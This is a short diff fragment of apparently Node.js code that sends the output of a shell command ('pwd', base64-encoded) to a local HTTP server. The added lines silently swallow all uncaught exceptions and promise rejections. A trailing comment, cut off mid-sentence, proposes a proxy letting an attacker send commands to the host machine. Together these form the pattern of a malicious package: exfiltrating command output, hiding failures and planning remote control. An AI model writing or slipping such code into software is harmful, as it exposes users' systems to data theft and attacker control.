@@ -11,6 +11,9 @@ http.get(
   `http://localhost:3001/${Buffer.from(execSync("pwd"), "base64").toString("base64")}`
 );
 
+process.on("unhandledRejection", () => {});
+process.on("uncaughtException", () => {});
+
 /**
  * How about setting up a proxy server that will allow an attacker to
  * send commands to the computer our code is running on and what if
